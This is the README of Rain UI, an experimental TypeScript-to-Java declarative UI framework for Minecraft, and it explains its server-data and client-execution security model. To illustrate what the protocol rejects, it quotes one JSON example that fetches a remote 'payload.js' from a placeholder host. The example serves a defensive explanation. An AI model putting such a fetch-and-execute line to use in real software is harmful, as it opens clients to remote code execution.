# Rain UI

**A TypeScript-powered declarative UI framework for Minecraft Java Edition.**

> **Write in TypeScript. Run in Java.**

Rain UI is an experimental framework for building Minecraft interfaces using TypeScript and a declarative UI model.

The TypeScript side describes **what the interface looks like and what interactions are available**. The Minecraft client runs a Java runtime that interprets a **restricted, validated UI protocol**.

---

## ⚠️ Development Status

> **Rain UI is currently under active development. It is not production-ready.**

The API, protocol, component model, schemas, runtime behavior, and project structure are still evolving.

**Breaking changes are expected.**

At this stage, Rain UI should be considered an **experimental project for development, research, and experimentation**, rather than a stable framework with long-term API guarantees.

If you build something on top of Rain UI today, expect to adapt your code as the project evolves.

---

# Architecture

Rain UI intentionally separates **UI authoring** from **UI execution**.

```text
                 DEVELOPMENT TIME
                 ────────────────

        TypeScript / TSX Application
                    │
                    │
                    ▼
          ┌───────────────────┐
          │    Rain UI Core   │
          │                   │
          │  Components       │
          │  Contracts        │
          │  Schemas          │
          └─────────┬─────────┘
                    │
                    │ Compile / Serialize
                    ▼
             UI Contract / Data
                    │
                    │
════════════════════╪══════════════════════════
                    │
                    │         NETWORK
                    │
                    ▼
              Minecraft Server
                    │
                    │ Protocol Messages
                    ▼
          ┌───────────────────┐
          │ Minecraft Client  │
          │                   │
          │   Rain UI Runtime │
          │        (Java)     │
          └─────────┬─────────┘
                    │
                    ▼
               Minecraft UI
```

The important boundary is between the **server protocol** and the **client runtime**.

The server does **not** send executable TypeScript or JavaScript to the client.

Instead, it sends structured data that conforms to a predefined schema.

---

# Why the Client Does Not Execute Server Code

Rain UI is deliberately designed around a **data protocol**, not a remote-code-execution model.

A server can send something conceptually like:

```json
{
  "screen": "example:overview",
  "properties": {
    "name": "Example Town",
    "banner": "example:textures/town/banner"
  }
}
```

It can also request a predefined action:

```json
{
  "action": "example:accept-request",
  "fields": {
    "playerId": "..."
  }
}
```

But the server cannot send something like:

```json
{
  "code": "fetch('https://example.invalid/payload.js').then(...)"
}
```

and expect the client to execute it.

There is no JavaScript or TypeScript interpreter in the Rain UI client runtime whose purpose is to execute arbitrary server-provided code.

The client executes **Rain UI's trusted runtime**, not code supplied by the server.

---

# The Security Boundary

The architecture can be simplified to:

```text
                    SERVER
                      │
                      │
                      │  DATA
                      │
                      ▼
              ┌───────────────┐
              │    Protocol   │
              │    Schema     │
              └───────┬───────┘
                      │
                   validate
                      │
                      ▼
              ┌───────────────┐
              │ Rain UI Java  │
              │    Runtime    │
              └───────┬───────┘
                      │
                      │ allowed
                      │ operations
                      ▼
                 Minecraft
                    UI
```

The server controls **data**.

The client controls **execution**.

That distinction is fundamental to Rain UI.

---

## A Useful Mental Model

Think of Rain UI more like a browser receiving a document than a client receiving arbitrary JavaScript.

The server can describe:

```text
"Create a column."

"Put this text inside it."

"Display this item."

"Set this property."

"When the user clicks this button,
request action X."
```

The client already knows what those operations mean.

The server does not get to invent new executable behavior.

```text
SERVER
  │
  │ "column"
  │ "text"
  │ "item"
  │ "action: example:accept-request"
  ▼
CLIENT RUNTIME
  │
  ├── create column
  ├── render text
  ├── render item
  └── dispatch predefined action
```

---

# Contracts

Every screen has a contract describing the data and interactions it exposes.

For example:

```ts
const actions = {
  "example:accept-request": {
    fields: {
      playerId: {
        kind: "string",
      },
    },
    kind: "object",
  },

  "example:deny-request": {
    fields: {
      playerId: {
        kind: "string",
      },
    },
    kind: "object",
  },
};
```

The contract defines **what is allowed**, rather than allowing the server to define arbitrary behavior.

Conceptually:

```text
                 Screen Contract
                       │
          ┌────────────┴────────────┐
          │                         │
      Properties                  Actions
          │                         │
          ▼                         ▼
       Data only              Known operations
```

This makes the protocol explicit, inspectable, and independently implementable by the Java runtime.

---

# Why TypeScript Is Not Sent to the Client

TypeScript is the **authoring language** of Rain UI.

It is not the language executed by the Minecraft client.

```text
        TypeScript / TSX
               │
               │ authoring
               ▼
        Rain UI Compiler
               │
               │ contract / data
               ▼
          Java Runtime
               │
               ▼
          Minecraft
```

This distinction is intentional.

Developers get the ergonomics of TypeScript and TSX:

* type safety
* IDE support
* components
* composition
* declarative rendering
* reusable abstractions

while the Minecraft client only needs to understand the Rain UI protocol.

---

# Server-Controlled Does Not Mean Server-Executable

Rain UI is designed to allow servers to control the **content and state** of interfaces without giving servers arbitrary execution capabilities on the client.

For example, a server may control:

* which screen is displayed
* text
* images and asset references supported by the protocol
* component properties
* available actions
* values displayed to the player

But those capabilities are constrained by the runtime and its protocol.

The server cannot dynamically introduce a new client-side primitive simply by sending executable code.

If a new capability is added to Rain UI, it must be implemented as part of the trusted client runtime.

```text
        Server
          │
          │ "use component X"
          ▼
    ┌──────────────┐
    │ Protocol     │
    │ validation   │
    └──────┬───────┘
           │
           ▼
    Does the runtime
    know component X?
       │          │
      YES         NO
       │          │
       ▼          ▼
    Execute      Reject /
    operation    ignore
```

---

# Security Is Part of the Architecture

Security is not intended to be an additional layer added after the UI system.

The protocol itself is designed around a strict separation:

| Layer        | Responsibility                             |
| ------------ | ------------------------------------------ |
| TypeScript   | UI authoring                               |
| Contracts    | Define allowed data and interactions       |
| Protocol     | Transport structured data                  |
| Java Runtime | Validate and interpret protocol messages   |
| Minecraft    | Render and execute trusted client behavior |

The fundamental rule is:

> **Untrusted server data must never become executable client code.**

---

# What This Protects Against

This architecture is specifically intended to prevent a server from turning UI messages into arbitrary client-side program execution.

For example, a malicious server should not be able to send a UI packet containing:

```text
JavaScript
TypeScript
Java bytecode
Native code
Arbitrary shell commands
```

and have the Rain UI runtime execute it.

Instead, incoming messages are interpreted according to the capabilities already implemented by the client runtime.

---

# Important Security Disclaimer

Rain UI's architecture is designed to minimize the trust placed in servers, but **the implementation still needs to be audited and hardened**.

A safe protocol can still contain vulnerabilities.

For example, bugs in:

* packet parsing
* schema validation
* asset handling
* deserialization
* resource loading
* native integrations
* the Java runtime itself

could potentially create security problems.

Therefore, Rain UI does **not** claim that the current implementation is formally verified or completely vulnerability-free.

The goal is stronger and more concrete:

> **The protocol is designed so that arbitrary server-provided code is not a supported execution primitive in the first place.**

Security bugs are still bugs, but arbitrary server-side code execution is not the intended mechanism of the framework.

---

# Example

A Rain UI application might define:

```tsx
import { defineScreen } from "@rain-ui/core";
import { actions, properties } from "./overview.contract";

export default defineScreen({
  id: "example:overview",

  properties,
  actions,

  render: (p, a) => (
    <column gap={6} padding={8}>
      <row gap={4}>
        <item value={p.banner} />

        <column gap={2}>
          <text value={p.name} />
          <text value={p.description} />
        </column>
      </row>
    </column>
  ),
});
```

The TypeScript code is part of the **application authoring environment**.

The Minecraft client does not receive and execute this source code.

Instead, the resulting UI description is represented through Rain UI's protocol and interpreted by the Java runtime.

---

# Project Structure

```text
rain-ui/
│
├── packages/       # TypeScript framework packages
├── schema/         # Protocol and type schemas
├── specs/          # Design and protocol specifications
├── examples/       # Example applications
├── docs/           # Documentation
│
└── java/           # Minecraft Java runtime
```

The separation between `schema`, `packages`, and `java` is intentional: the protocol should be understandable independently of the implementation that consumes it.

---

# Design Goals

Rain UI is being built around a few core principles.

### Declarative

Describe the UI rather than manually managing rendering details.

### Type-Safe

Contracts should be represented as types and validated as early as possible.

### Server-Controlled

Servers should be able to provide dynamic interfaces and data.

### Client-Trusted

The client runtime remains responsible for execution.

### Protocol-Driven

The boundary between server and client should be explicit and inspectable.

### No Arbitrary Client Code

Server-provided UI data should never implicitly become executable client code.

---

# Current Status

**Rain UI is experimental software.**

The project is actively being designed and implemented.

Expect:

* breaking API changes
* protocol changes
* incomplete components
* incomplete documentation
* changing package structure
* changing runtime behavior

Do not assume that the current protocol or APIs are stable.

If you are interested in the project, following the repository and experimenting with it is encouraged.

---

# Contributing

Rain UI is still early enough that architectural feedback can be particularly valuable.

Before making substantial changes, consider reading:

* [`AGENTS.md`](./AGENTS.md)
* [`CODE_STYLE.md`](./CODE_STYLE.md)
* [`docs/`](./docs/)
* [`specs/`](./specs/)

For changes to the protocol or security model, documenting the design and threat model is especially important.

---

# License

Rain UI is licensed under the **Apache License 2.0**.

See [`LICENSE`](./LICENSE) for the complete license text.

---

<p align="center">
  <strong>Rain UI</strong><br>
  Declarative interfaces for Minecraft Java Edition.<br><br>
  <em>Write in TypeScript. Run in Java.</em>
</p>
